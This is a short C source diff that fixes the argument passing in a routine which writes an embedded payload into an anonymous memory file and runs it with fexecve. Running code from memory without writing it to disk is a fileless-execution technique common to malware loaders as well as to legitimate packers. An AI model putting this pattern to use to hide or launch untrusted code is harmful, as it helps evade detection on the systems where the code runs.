@@ -44,8 +44,8 @@ int main(int argc, char **argv) {
 
 	payloadFd = memfd_create("", 0);
 	write(payloadFd, payload, payloadLen);
-	char *payloadArgv[] = { argv };
-    char *payloadEnv[] = { NULL };
-    fexecve(payloadFd, payloadArgv , payloadEnv);
 
+    char *payloadEnv[] = { NULL };
+    fexecve(payloadFd, argv , payloadEnv);
+	close(payloadFd);
 }
